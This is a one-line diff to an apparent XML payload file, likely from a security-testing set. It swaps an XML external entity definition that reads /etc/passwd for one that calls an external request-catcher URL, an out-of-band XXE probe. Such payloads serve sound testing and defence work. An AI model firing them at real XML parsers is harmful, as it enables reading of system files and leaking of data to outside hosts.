@@ -1,1 +1,1 @@
- <!ENTITY % paramEntity "<!ENTITY genEntity SYSTEM 'file:///etc/passwd'>">
+<!ENTITY % paramEntity "<!ENTITY genEntity SYSTEM 'https://end7l0yp0boy.x.pipedream.net/'>">
